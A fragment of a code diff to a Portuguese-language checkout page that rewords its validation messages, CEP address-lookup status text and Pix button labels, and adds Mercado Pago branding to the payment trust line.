+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#009ee3" stroke-width="2.2">
             <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
             <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
           </svg>
-          <span>Pagamento processado em ambiente 100% seguro</span>
+          <span>Pagamento 100% processado e garantido pelo Mercado Pago</span>
         </div>
       </form>
     </section>
@@ -1169,10 +1208,10 @@ a { color: inherit; text-decoration: none; }
       const val = input.value.trim();
       if (!val) return 'Preencha este campo.';
       if (id === 'name' && val.split(/\s+/).length < 2) return 'Informe nome e sobrenome.';
-      if (id === 'cpf' && !validateCpf(val)) return 'Confira os dígitos do CPF.';
+      if (id === 'cpf' && !validateCpf(val)) return 'Confira os dígitos do seu CPF.';
       if (id === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) return 'Informe um e-mail válido.';
-      if (id === 'phone' && digits(val).length < 10) return 'Informe celular com DDD.';
-      if (id === 'cep' && digits(val).length !== 8) return 'Informe o CEP completo.';
+      if (id === 'phone' && digits(val).length < 10) return 'Informe seu celular com DDD.';
+      if (id === 'cep' && digits(val).length !== 8) return 'Informe o CEP completo com 8 dígitos.';
       return '';
     }
 
@@ -1280,7 +1319,7 @@ a { color: inherit; text-decoration: none; }
     async function lookupCep() {
       const cep = digits(el('cep').value);
       if (cep.length !== 8) {
-        el('cepStatus').textContent = 'Digite os 8 números do CEP.';
+        el('cepStatus').textContent = 'Digite os 8 números do seu CEP.';
         return;
       }
       cepAbortController?.abort();
@@ -1301,7 +1340,7 @@ a { color: inherit; text-decoration: none; }
         if (data.bairro) el('district').value = data.bairro;
         if (data.localidade) el('city').value = data.localidade;
         if (data.uf) el('state').value = data.uf;
-        el('cepStatus').textContent = 'Endereço encontrado! Preencha o número.';
+        el('cepStatus').textContent = 'Endereço encontrado! Preencha o número da residência.';
         el('number').focus();
       } catch (err) {
         if (digits(el('cep').value) === cep) {
@@ -1341,7 +1380,7 @@ a { color: inherit; text-decoration: none; }
 
       isSubmitting = true;
       finishBtn.disabled = true;
-      finishBtn.textContent = 'Gerando Pix…';
+      finishBtn.textContent = 'Gerando Pix no Mercado Pago…';
 
       const customer = {
         name: el('name').value.trim(),
@@ -1404,7 +1443,7 @@ a { color: inherit; text-decoration: none; }
       } finally {
         isSubmitting = false;
         finishBtn.disabled = false;
-        finishBtn.textContent = 'Continuar com Pix';
+        finishBtn.textContent = 'Continuar com Pix Mercado Pago';
       }
     }
 
